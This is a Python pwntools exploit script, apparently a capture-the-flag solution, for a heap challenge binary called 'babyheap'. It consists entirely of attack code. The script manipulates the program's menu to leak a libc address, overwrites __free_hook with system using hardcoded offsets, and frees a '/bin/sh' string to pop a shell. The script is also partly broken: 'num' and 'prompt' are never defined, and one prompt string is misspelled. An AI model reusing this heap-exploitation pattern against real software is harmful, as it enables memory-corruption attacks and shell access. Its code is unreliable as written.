from pwn import *

p = process('./babyheap')

#create team
p.sendlineafter('>', '1')
p.sendafter('lengh :', str(0x20))
p.sendafter('Description :', 'fuck')

#manage team
p.sendlineafter('>', '3')
p.sendlineafter("Index :", '0')

inputname = ["/bin/sh\x00" for x in xrange(255)]

#add member
p.sendlineafter('>', "1")
p.sendlineafter("employment :", str(255))
for x in xrange(num):
    p.sendlineafter("Name :", inputname[x])
    p.sendlineafter("Description :", inputname[x])

#remove
p.sendlineafter('>', "2")
p.sendlineafter("Index :", str(0))

#menu
p.sendlineafter('>','5')

#create team
p.sendlineafter('>', "1")
p.sendlineafter("length :", str(0xc8))
p.sendlineafter("Description :", 'fuck')
#leak
p.sendlineafter('>', "4")
for x in xrange(2):
    p.recvuntil("Description : ")
leak = u64(p.recv(6).ljust(8, "\x00"))

libc = leak - 0x3c4b0a
free_hook =libc + 0x3c67a8
system = libc + 0x45390

#manage team
p.sendlineafter('>', "3")
p.sendlineafter("Index :", str(0))
#add member
p.sendlineafter('>', "1")
p.sendlineafter("employment :", str(1))

#menu
p.sendlineafter('>','5')

#create team
p.sendlineafter(prompt, "1")
p.sendlineafter("length :", str(0x7f0))
p.sendafter("Description :", p64(free_hook))

#manage team
p.sendlineafter('>', "3")
p.sendlineafter("Index :", str(0)) 

#edit member
p.sendlineafter('>', "4")
p.sendlineafter("Index :", str(0))
p.sendlineafter("Description :", p64(system))

#remove member
p.sendlineafter('>', "2")
p.sendlineafter("Index :", str(4))

p.interactive()
